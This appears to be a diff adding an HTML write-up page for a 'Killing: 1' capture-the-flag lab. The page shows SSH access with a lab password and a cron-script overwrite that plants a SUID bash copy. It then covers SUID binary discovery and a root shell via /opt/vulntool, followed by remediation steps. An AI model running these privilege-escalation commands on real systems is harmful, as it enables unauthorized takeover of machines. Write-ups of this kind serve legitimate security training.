+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-comment"># 1. Access the target host perimeter over SSH</span>
+<span class="code-prompt">attacker@kali:~$ </span>ssh user1@10.0.2.15
+user1@10.0.2.15's password: <span class="code-comment">[Spring2026!]</span>
+Welcome to Lubuntu 24.04 LTS (GNU/Linux 6.8.0-31-generic x86_64)
+
+<span class="code-comment"># 2. Audit current directory context listings</span>
+<span class="code-prompt">user1@killing1:~$ </span>ls -la
+<span class="code-output">total 28
+drwxr-xr-x 4 user1 user1 4096 Oct 22 09:30 .
+drwxr-xr-x 4 root  root  4096 Oct 22 08:45 ..
+-rw-r--r-- 1 user1 user1  220 Oct 22 08:45 .bash_logout
+-rw-r--r-- 1 user1 user1 3771 Oct 22 08:45 .bashrc
+-rw-r--r-- 1 user1 user1  807 Oct 22 08:45 .profile
+-r-------- 1 user1 user1   32 Oct 22 09:12 .sys_check_report</span></pre>
+                  </div>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+                    Token Extraction
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">cat ~/.sys_check_report</span>
+                      <button type="button" class="copy-btn" data-copy="cat ~/.sys_check_report" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">user1@killing1:~$ </span>cat ~/.sys_check_report
+<span class="code-output">flag{found_the_leaked_creds}</span></pre>
+                  </div>
+
+                  <!-- Flag 1 Box -->
+                  <div class="flag-box">
+                    <div class="flag-box-left">
+                      <span class="flag-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+                      </span>
+                      <div class="flag-content">
+                        <span class="flag-tag">Captured Token 01</span>
+                        <span class="flag-value">flag{found_the_leaked_creds}</span>
+                      </div>
+                    </div>
+                    <button type="button" class="copy-btn" data-copy="flag{found_the_leaked_creds}" title="Copy Flag 1">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                      <span>Copy Flag</span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+          <!-- STAGE 4 (3.3): Lateral Movement Pipeline Exploitation -->
+          <article class="stage-item" id="stage-4" data-stage="4">
+            <header class="stage-header" tabindex="0" role="button" aria-expanded="false" aria-controls="content-stage-4">
+              <div class="stage-header-left">
+                <div class="stage-index-badge">3.3</div>
+                <div class="stage-header-text">
+                  <div class="stage-tagline">
+                    <span>Phase 04 • Cron Script Abuse</span>
+                    <span class="flag-indicator-pill">Flag 2</span>
+                  </div>
+                  <h3 class="stage-title">3.3 Lateral Movement Pipeline Exploitation (Pivoting to user2)</h3>
+                </div>
+              </div>
+              <div class="stage-header-right">
+                <button type="button" class="step-check-btn" data-step="4" title="Mark Stage 3.3 as completed" aria-label="Mark Stage 3.3 as completed">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span class="check-text">Complete</span>
+                </button>
+                <div class="accordion-chevron" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+              </div>
+            </header>
+
+            <div class="stage-content-wrapper" id="content-stage-4">
+              <div class="stage-content-inner">
+                <div class="stage-body">
+                  <p>
+                    Local privilege auditing discovered a system-wide Cron job configuration running background processing operations at 60-second intervals under the context of <span class="inline-code">user2</span>. The task runs an automation script located at <span class="inline-code">/opt/scripts/cleanup.sh</span>. The file permissions on this target asset were misconfigured to allow global world-writable operations (<span class="inline-code">777</span>).
+                  </p>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                    Command Sequence
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">Inject SUID Terminal Duplicate Payload</span>
+                      <button type="button" class="copy-btn" data-copy="export TERM=xterm
+echo 'cp /bin/bash /tmp/newbash; chmod 4755 /tmp/newbash' > /opt/scripts/cleanup.sh" title="Copy command sequence">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-comment"># 1. Enforce shell terminal processing baseline parameters</span>
+<span class="code-prompt">user1@killing1:~$ </span>export TERM=xterm
+
+<span class="code-comment"># 2. Overwrite the cleanup routine to inject a SUID terminal duplicate payload</span>
+<span class="code-prompt">user1@killing1:~$ </span>echo 'cp /bin/bash /tmp/newbash; chmod 4755 /tmp/newbash' > /opt/scripts/cleanup.sh
+
+<span class="code-comment"># 3. Wait 60 seconds for scheduling execution, then run verification</span>
+<span class="code-prompt">user1@killing1:~$ </span>ls -la /tmp/newbash
+<span class="code-output">-rwsr-xr-x 1 user2 user2 1446024 Oct 22 10:20 <span class="code-highlight">/tmp/newbash</span></span></pre>
+                  </div>
+
+                  <div class="note-box">
+                    <strong>Expected State:</strong> The duplicate binary matches SUID flags: <span class="inline-code">-rwsr-xr-x 1 user2 user2 ... /tmp/newbash</span>.
+                  </div>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                    Privilege Execution Escalation & Token Extraction
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">Escalate to user2 & Read Flag 2</span>
+                      <button type="button" class="copy-btn" data-copy="/tmp/newbash -p" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">user1@killing1:~$ </span>/tmp/newbash -p
+<span class="code-prompt">newbash-5.2$ </span>whoami
+<span class="code-output">user2</span>
+
+<span class="code-prompt">newbash-5.2$ </span>cat /home/user2/.cache_verify
+<span class="code-output">flag{pivoted_via_cron}</span></pre>
+                  </div>
+
+                  <!-- Flag 2 Box -->
+                  <div class="flag-box">
+                    <div class="flag-box-left">
+                      <span class="flag-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+                      </span>
+                      <div class="flag-content">
+                        <span class="flag-tag">Captured Token 02</span>
+                        <span class="flag-value">flag{pivoted_via_cron}</span>
+                      </div>
+                    </div>
+                    <button type="button" class="copy-btn" data-copy="flag{pivoted_via_cron}" title="Copy Flag 2">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                      <span>Copy Flag</span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+          <!-- STAGE 5 (3.4): Vertical Privilege Takeover (root) -->
+          <article class="stage-item" id="stage-5" data-stage="5">
+            <header class="stage-header" tabindex="0" role="button" aria-expanded="false" aria-controls="content-stage-5">
+              <div class="stage-header-left">
+                <div class="stage-index-badge">3.4</div>
+                <div class="stage-header-text">
+                  <div class="stage-tagline">
+                    <span>Phase 05 • Root SUID Binary Hijack</span>
+                    <span class="flag-indicator-pill">Flag 3</span>
+                  </div>
+                  <h3 class="stage-title">3.4 Vertical Privilege Takeover (Gaining Absolute root Shell)</h3>
+                </div>
+              </div>
+              <div class="stage-header-right">
+                <button type="button" class="step-check-btn" data-step="5" title="Mark Stage 3.4 as completed" aria-label="Mark Stage 3.4 as completed">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span class="check-text">Complete</span>
+                </button>
+                <div class="accordion-chevron" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+              </div>
+            </header>
+
+            <div class="stage-content-wrapper" id="content-stage-5">
+              <div class="stage-content-inner">
+                <div class="stage-body">
+                  <p>
+                    Operating inside the execution profile of <span class="inline-code">user2</span>, an analysis scan for anomalous Set-Owner User ID (<span class="inline-code">SUID</span>) application items was deployed across the system interface.
+                  </p>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                    Command Sequence & Discovery Flag
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">Scan SUID Binaries</span>
+                      <button type="button" class="copy-btn" data-copy="find / -perm -4000 -type f 2>/dev/null" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">newbash-5.2$ </span>find / -perm -4000 -type f 2>/dev/null
+<span class="code-output">/usr/bin/passwd
+/usr/bin/sudo
+/tmp/newbash
+<span class="code-highlight">/opt/vulntool</span></span></pre>
+                  </div>
+
+                  <div class="note-box">
+                    <strong>Discovery Flag:</strong> The scan isolates a proprietary, non-standard application container located at <span class="inline-code">/opt/vulntool</span> configured with high-privilege administrative execution capabilities.
+                  </div>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                    Execution Routine & Token Extraction
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">Execute /opt/vulntool & Claim Root Flag</span>
+                      <button type="button" class="copy-btn" data-copy="/opt/vulntool" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">newbash-5.2$ </span>/opt/vulntool
+<span class="code-prompt">root@killing1:~# </span>whoami
+<span class="code-output">root</span>
+
+<span class="code-prompt">root@killing1:~# </span>cat /root/.audit_final
+<span class="code-output">flag{root_via_suid}</span></pre>
+                  </div>
+
+                  <!-- Flag 3 Box -->
+                  <div class="flag-box">
+                    <div class="flag-box-left">
+                      <span class="flag-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                      </span>
+                      <div class="flag-content">
+                        <span class="flag-tag">Captured Token 03 (Root)</span>
+                        <span class="flag-value">flag{root_via_suid}</span>
+                      </div>
+                    </div>
+                    <button type="button" class="copy-btn" data-copy="flag{root_via_suid}" title="Copy Flag 3">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                      <span>Copy Flag</span>
+                    </button>
+                  </div>
+
+                  <div class="note-box success-note" style="margin-top: 0.75rem;">
+                    <strong>Final Analysis Deduction:</strong> Complete system infrastructure takeover achieved successfully.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         4. VULNERABILITY REMEDIATION & SYSTEM HARDENING BLUEPRINT
+         ========================================================================== -->
+    <section class="section-wrapper" id="lessons">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            <span>Section 4</span>
+          </div>
+          <h2 class="section-title">4. Vulnerability Remediation & System Hardening Blueprint</h2>
+          <p class="section-desc">
+            Defensive engineering matrix pairing each security weakness exploited during the lab with industry-standard mitigation strategies.
+          </p>
+        </div>
+
+        <div class="lessons-grid">
+          <!-- Case A -->
+          <article class="lesson-card">
+            <div class="lesson-card-header">
+              <div class="lesson-icon-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+              </div>
+              <div>
+                <span class="lesson-case-tag">Case A</span>
+                <h3 class="lesson-title">Exposed Staging Backups Under Webroot</h3>
+              </div>
+            </div>
+            <div class="vuln-desc-box">
+              <strong>Exploitation Context:</strong> Plaintext system keys and credentials left within unlinked web deployment paths assume attackers will not run brute-force path profiling.
+            </div>
+            <div class="fix-container">
+              <div class="fix-label">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                <span>Remediation Strategy</span>
+              </div>
+              <div class="fix-content">
+                Permanently remove sensitive code elements from the accessible web server directory layout. Enforce systemic folder listing restrictions within global configuration modules:
+                <code class="fix-code"># Prevent unauthenticated directory file mappings globally
+Options -Indexes</code>
+              </div>
+            </div>
+          </article>
+
+          <!-- Case B -->
+          <article class="lesson-card">
+            <div class="lesson-card-header">
+              <div class="lesson-icon-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+              </div>
+              <div>
+                <span class="lesson-case-tag">Case B</span>
+                <h3 class="lesson-title">World-Writable Automation Tasks (Cron Script Abuse)</h3>
+              </div>
+            </div>
+            <div class="vuln-desc-box">
+              <strong>Exploitation Context:</strong> Assigning open group write permissions (<code>777</code>) to operational scripts parsed by system-wide background agents enables arbitrary code execution injection.
+            </div>
+            <div class="fix-container">
+              <div class="fix-label">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                <span>Remediation Strategy</span>
+              </div>
+              <div class="fix-content">
+                Revoke global write access. Enforce standard restrictive configuration control mappings so that only authorized owners or administrative contexts can alter file operations:
+                <code class="fix-code">chown root:root /opt/scripts/cleanup.sh
+chmod 750 /opt/scripts/cleanup.sh</code>
+              </div>
+            </div>
+          </article>
+
+          <!-- Case C -->
+          <article class="lesson-card">
+            <div class="lesson-card-header">
+              <div class="lesson-icon-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+              </div>
+              <div>
+                <span class="lesson-case-tag">Case C</span>
+                <h3 class="lesson-title">Unsafe SUID Binary Assignments</h3>
+              </div>
+            </div>
+            <div class="vuln-desc-box">
+              <strong>Exploitation Context:</strong> Leaving custom binaries with active SUID bits allows non-root users to inherit system-level permissions. If these files can be manipulated into spawning sub-processes, full root compromise occurs.
+            </div>
+            <div class="fix-container">
+              <div class="fix-label">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                <span>Remediation Strategy</span>
+              </div>
+              <div class="fix-content">
+                Strip the SUID bit from custom utilities. Instead, grant explicit system capabilities (<code>setcap</code>) or implement highly restricted, parameters-validated authorization rules inside the system sudoers file structure:
+                <code class="fix-code"># Remove execution impersonation privileges completely
+chmod u-s /opt/vulntool</code>
+              </div>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         5. TECHNICAL COMPETENCIES VALIDATED
+         ========================================================================== -->
+    <section class="section-wrapper" id="skills">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
+            <span>Section 5</span>
+          </div>
+          <h2 class="section-title">5. Technical Competencies Validated</h2>
+          <p class="section-desc">
+            Core tactical skills and penetration testing proficiencies demonstrated throughout the intrusion lifecycle.
+          </p>
+        </div>
+
+        <div class="skills-badges-wrap">
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+            <span>Highly Focused System & Network Enumeration (Nmap)</span>
+          </div>
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <span>Web Infrastructure Attack Path Profiling</span>
+          </div>
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            <span>Secure Shell (SSH) Access Interrogation Mappings</span>
+          </div>
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+            <span>Task Automation Hijacking Vectors (Cron Job Overwrite)</span>
+          </div>
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            <span>High-Privilege System Attribute Takeover (SUID Manipulation)</span>
+          </div>
+          <div class="skill-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"></rect><line x1="7" y1="2" x2="7" y2="22"></line><line x1="17" y1="2" x2="17" y2="22"></line><line x1="2" y1="12" x2="22" y2="12"></line><line x1="2" y1="7" x2="7" y2="7"></line><line x1="2" y1="17" x2="7" y2="17"></line><line x1="17" y1="17" x2="22" y2="17"></line><line x1="17" y1="7" x2="22" y2="7"></line></svg>
+            <span>Automation & Shell Script Engineering (Bash)</span>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- ==========================================================================
+       FOOTER
+       ========================================================================== -->
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-grid">
+        <div class="footer-brand-col">
+          <div class="footer-title">
+            <span class="nav-brand-dot"></span>
+            <span>Killing: 1</span>
+          </div>
+          <p class="footer-sub">
+            Built as a personal cybersecurity learning project to explore offensive and defensive Linux system architectures.
+          </p>
+          <div class="footer-disclaimer-mini">
+            Notice: This offensive security documentation report was created strictly for educational purposes within an authorized, isolated sandbox network setting. Running unauthorized infrastructure attacks against public systems is illegal.
+          </div>
+        </div>
+
+        <div class="footer-links-col">
+          <a href="https://github.com/MohammedRifad123/killing-dark-access" target="_blank" rel="noopener noreferrer" id="footerGithubLink">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+            <span>Project Repository</span>
+          </a>
+          <a href="#hero">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"></polyline></svg>
+            <span>Back to Top</span>
+          </a>
+        </div>
+      </div>
+
+      <div class="footer-copyright">
+        <span>&copy; 2026 Killing: 1 CTF Security Report. Released under MIT License.</span>
+        <span>Vanilla HTML • CSS • JS | GitHub Pages Ready</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ==========================================================================
+       VANILLA JAVASCRIPT LOGIC
+       ========================================================================== -->
+  <script>
+    (function() {
+      'use strict';
+
+      const TOTAL_STAGES = 5;
+      const completedStages = new Set();
+
+      const stageItems = document.querySelectorAll('.stage-item');
+      const progressBar = document.getElementById('globalProgressBar');
+      const progressPercent = document.getElementById('progressPercent');
+      const completedCountElem = document.getElementById('completedStagesCount');
+      const flagsCapturedElem = document.getElementById('flagsCapturedCount');
+      const btnExpandAll = document.getElementById('btnExpandAll');
+      const btnCollapseAll = document.getElementById('btnCollapseAll');
+
+      // Stages with flags: Stage 3 (Flag 1), Stage 4 (Flag 2), Stage 5 (Flag 3)
+      const flagStages = [3, 4, 5];
+
+      const chainNodeMap = {
+        1: { node: document.getElementById('chainNode1'), status: document.getElementById('chainStatus1') },
+        2: { node: document.getElementById('chainNode2'), status: document.getElementById('chainStatus2') },
+        3: { node: document.getElementById('chainNode3'), status: document.getElementById('chainStatus3') },
+        4: { node: document.getElementById('chainNode4'), status: document.getElementById('chainStatus4') },
+        5: { node: document.getElementById('chainNode5'), status: document.getElementById('chainStatus5') }
+      };
+
+      // Accordion click & keyboard controls
+      stageItems.forEach(item => {
+        const header = item.querySelector('.stage-header');
+        header.addEventListener('click', (e) => {
+          if (e.target.closest('.step-check-btn')) return;
+          const isOpen = item.classList.contains('open');
+          item.classList.toggle('open');
+          header.setAttribute('aria-expanded', !isOpen);
+        });
+
+        header.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            if (e.target.closest('.step-check-btn')) return;
+            e.preventDefault();
+            const isOpen = item.classList.contains('open');
+            item.classList.toggle('open');
+            header.setAttribute('aria-expanded', !isOpen);
+          }
+        });
+      });
+
+      // Expand All / Collapse All
+      btnExpandAll.addEventListener('click', () => {
+        stageItems.forEach(item => {
+          item.classList.add('open');
+          item.querySelector('.stage-header').setAttribute('aria-expanded', 'true');
+        });
+      });
+
+      btnCollapseAll.addEventListener('click', () => {
+        stageItems.forEach(item => {
+          item.classList.remove('open');
+          item.querySelector('.stage-header').setAttribute('aria-expanded', 'false');
+        });
+      });
+
+      // Progress Tracker
+      function updateProgress() {
+        const count = completedStages.size;
+        const percentage = Math.round((count / TOTAL_STAGES) * 100);
+
+        if (progressBar) progressBar.style.width = percentage + '%';
+        if (progressPercent) progressPercent.textContent = percentage + '%';
+        if (completedCountElem) completedCountElem.textContent = count;
+
+        let flags = 0;
+        flagStages.forEach(st => {
+          if (completedStages.has(st)) flags++;
+        });
+        if (flagsCapturedElem) flagsCapturedElem.textContent = flags;
+
+        for (const [stageNum, chainObj] of Object.entries(chainNodeMap)) {
+          const num = parseInt(stageNum, 10);
+          if (chainObj && chainObj.node) {
+            if (completedStages.has(num)) {
+              chainObj.node.classList.add('completed');
+              if (chainObj.status) {
+                chainObj.status.innerHTML = `
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span>Done</span>
+                `;
+              }
+            } else {
+              chainObj.node.classList.remove('completed');
+              if (chainObj.status) {
+                chainObj.status.innerHTML = `
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                  <span>Pending</span>
+                `;
+              }
+            }
+          }
+        }
+      }
+
+      // Check button toggling
+      const checkButtons = document.querySelectorAll('.step-check-btn');
+      checkButtons.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          const stepNum = parseInt(btn.dataset.step, 10);
+          const stageItem = document.getElementById('stage-' + stepNum);
+          const textSpan = btn.querySelector('.check-text');
+
+          if (completedStages.has(stepNum)) {
+            completedStages.delete(stepNum);
+            stageItem.classList.remove('is-completed');
+            if (textSpan) textSpan.textContent = 'Complete';
+          } else {
+            completedStages.add(stepNum);
+            stageItem.classList.add('is-completed');
+            if (textSpan) textSpan.textContent = 'Completed';
+          }
+
+          updateProgress();
+        });
+      });
+
+      // Chain node jumps
+      const chainNodes = document.querySelectorAll('.chain-node');
+      chainNodes.forEach(node => {
+        node.addEventListener('click', (e) => {
+          e.preventDefault();
+          const targetId = node.getAttribute('data-target');
+          const targetElem = document.getElementById(targetId);
+
+          if (targetElem) {
+            targetElem.classList.add('open');
+            targetElem.querySelector('.stage-header').setAttribute('aria-expanded', 'true');
+            targetElem.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+            targetElem.style.transition = 'box-shadow 0.3s ease';
+            targetElem.style.boxShadow = '0 0 20px rgba(194, 59, 59, 0.4)';
+            setTimeout(() => {
+              targetElem.style.boxShadow = '';
+            }, 1200);
+          }
+        });
+      });
+
+      // Copy Buttons
+      const copyButtons = document.querySelectorAll('.copy-btn');
+      copyButtons.forEach(btn => {
+        btn.addEventListener('click', async (e) => {
+          e.stopPropagation();
+          const textToCopy = btn.getAttribute('data-copy');
+          if (!textToCopy) return;
+
+          try {
+            await navigator.clipboard.writeText(textToCopy);
+            const originalHTML = btn.innerHTML;
+            btn.classList.add('copied');
+            btn.innerHTML = `
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <span>Copied!</span>
+            `;
+
+            setTimeout(() => {
+              btn.classList.remove('copied');
+              btn.innerHTML = originalHTML;
+            }, 2000);
+          } catch (err) {
+            const textArea = document.createElement('textarea');
+            textArea.value = textToCopy;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.classList.add('copied');
